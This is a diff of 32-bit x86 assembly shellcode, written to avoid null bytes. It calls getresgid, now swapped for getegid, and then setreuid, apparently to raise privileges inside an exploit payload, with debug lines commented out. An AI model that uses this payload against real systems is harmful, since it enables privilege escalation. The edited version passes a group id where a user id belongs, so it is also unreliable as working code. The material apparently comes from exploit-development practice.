@@ -1,3 +1,5 @@
+default rel
+
 bits 32
 
 global _start
@@ -5,23 +7,27 @@ section .text
 
 _start:
     mov ebp, esp        ; get some storage space for getresgid
-    add ebp, 0x20
+    add ebp, 0x24
 
-    ; gerresgid() -- store ebp = rgid, ebp+0x4 = egid, ebp+0x8 = sgid
-    push 0x7f           ; need 0xab in eax to call getresgid
-    pop eax             ; but push 0xab results in null bytes
-    add eax, 0x2c       ; so, obnoxious workaround: put 0x7f in eax, then add 0x2c
-    mov ebx, ebp        ; &rgid arg
-    mov ecx, ebp
-    add ecx, 0x4        ; &egid arg
-    mov edx, ebp
-    add edx, 0x8        ; &sgid arg
+    push 0x32
+    pop eax
+    ; getresgid() -- store ebp = rgid, ebp+0x4 = egid, ebp+0x8 = sgid
+    ; push 0x7f           ; need 0xab in eax to call getresgid
+    ; pop eax             ; but push 0xab results in null bytes
+    ; add eax, 0x2c       ; so, obnoxious workaround: put 0x7f in eax, then add 0x2c
+    ; lea ebx, 0xffaca7c4 ; store rgid
+    ; lea ecx, 0xffaca7c8 ; store egid
+    ; lea edx, 0xffaca7cc ; store sgid
     int 0x80
     mov edi, eax        ; store result (0 for success)
+;     xor esi, esi        ; deliberate crash, for debug
+;     call [esi]
 
     ; setreuid(sgid, sgid)
-    mov ebx, [ebp+0x8]  ; arg0
-    mov ecx, ebx        ; arg1
+;     mov ebx, [ebp+0x8]  ; arg0
+;     mov ecx, ebx        ; arg1
+    mov ebx, eax
+    mov ecx, eax
     push 0x46
     pop eax             ; syscall # for setreuid
     int 0x80
